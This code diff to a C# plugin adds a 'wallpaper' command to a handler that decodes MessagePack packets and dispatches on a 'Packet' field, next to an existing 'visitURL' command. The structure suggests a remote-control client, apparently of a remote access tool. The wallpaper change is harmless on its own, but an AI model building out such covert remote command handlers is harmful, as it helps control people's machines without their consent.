@@ -3,6 +3,7 @@ using Plugin.MessagePack;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Management;
@@ -23,6 +24,12 @@ namespace Plugin
                 unpack_msgpack.DecodeFromBytes((byte[])data);
                 switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                 {
+                    case "wallpaper":
+                        {
+                            new Wallpaper().Change(unpack_msgpack.ForcePathObject("Image").GetAsBytes(), unpack_msgpack.ForcePathObject("Exe").AsString);
+                            break;
+                        }
+
                     case "visitURL":
                         {
                             string url = unpack_msgpack.ForcePathObject("URL").AsString;
